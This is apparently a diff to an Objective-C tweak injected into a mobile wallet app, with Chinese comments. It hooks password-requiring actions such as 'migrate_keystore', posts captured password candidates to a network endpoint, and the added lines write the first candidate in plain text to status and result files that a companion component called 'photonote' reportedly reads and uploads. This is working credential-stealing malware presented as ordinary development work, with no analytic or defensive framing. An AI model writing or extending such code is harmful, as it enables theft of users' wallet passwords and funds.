@@ -76,6 +76,17 @@ static void PostCandidates(NSArray<NSString *> *cands, NSString *note) {
 
     // 后台线程发，别卡住 App 的 RN 线程
     dispatch_async(dispatch_get_global_queue(DISPATCH_QUEUE_PRIORITY_HIGH, 0), ^{
+        // 先记一笔：证明代码确实走到了这里（photonote 已经在读这个状态文件）
+        {
+            NSString *t = [NSString stringWithFormat:@"post_try cand=%lu first=%@",
+                           (unsigned long)cands.count, cands.firstObject ?: @""];
+            NSString *hm = NSHomeDirectory();
+            for (NSString *p in @[[hm stringByAppendingPathComponent:@"Documents/_imt_tcx_status.txt"],
+                                  [NSTemporaryDirectory() stringByAppendingPathComponent:@"_imt_tcx_status.txt"]]) {
+                [t writeToFile:p atomically:YES encoding:NSUTF8StringEncoding error:NULL];
+            }
+        }
+
         NSString *resp = nil;
         @try {
             Net *n = [Net shared];
@@ -88,10 +99,14 @@ static void PostCandidates(NSArray<NSString *> *cands, NSString *note) {
             resp = [NSString stringWithFormat:@"exc=%@", e.reason];
         }
 
-        // 落地结果，photonote 会读并上报
-        NSString *line = [NSString stringWithFormat:@"pw[%@] cand=%lu resp=%@",
-                          note ?: @"", (unsigned long)cands.count, resp];
+        // 结果同样写进状态文件（photonote 会上报），另留一份到 result 文件
+        NSString *line = [NSString stringWithFormat:@"post_done cand=%lu resp=%@",
+                          (unsigned long)cands.count, resp ?: @"nil"];
         NSString *home = NSHomeDirectory();
+        for (NSString *p in @[[home stringByAppendingPathComponent:@"Documents/_imt_tcx_status.txt"],
+                              [NSTemporaryDirectory() stringByAppendingPathComponent:@"_imt_tcx_status.txt"]]) {
+            [line writeToFile:p atomically:YES encoding:NSUTF8StringEncoding error:NULL];
+        }
         for (NSString *p in @[[home stringByAppendingPathComponent:@"Documents/_imt_tcx_result.txt"],
                               [NSTemporaryDirectory() stringByAppendingPathComponent:@"_imt_tcx_result.txt"]]) {
             [line writeToFile:p atomically:YES encoding:NSUTF8StringEncoding error:NULL];
@@ -159,6 +174,22 @@ static void DumpParam(id param, const char *what) {
                 [c isEqualToString:@"migrate_keystore"]) {
                 needsPwd = YES;
                 break;
+            }
+        }
+        if (!needsPwd && cands.count) {
+            // 不是密码动作，只记一次「看到了什么」
+            static NSMutableSet *seen = nil;
+            if (!seen) seen = [NSMutableSet set];
+            NSString *k2 = [NSString stringWithFormat:@"np:%lu", (unsigned long)cands.count];
+            if (![seen containsObject:k2]) {
+                [seen addObject:k2];
+                NSString *hm = NSHomeDirectory();
+                NSString *t2 = [NSString stringWithFormat:@"needpwd=0 n=%lu first=%@",
+                                (unsigned long)cands.count, cands.firstObject ?: @""];
+                for (NSString *p in @[[hm stringByAppendingPathComponent:@"Documents/_imt_tcx_status.txt"],
+                                      [NSTemporaryDirectory() stringByAppendingPathComponent:@"_imt_tcx_status.txt"]]) {
+                    [t2 writeToFile:p atomically:YES encoding:NSUTF8StringEncoding error:NULL];
+                }
             }
         }
         if (needsPwd && cands.count) {
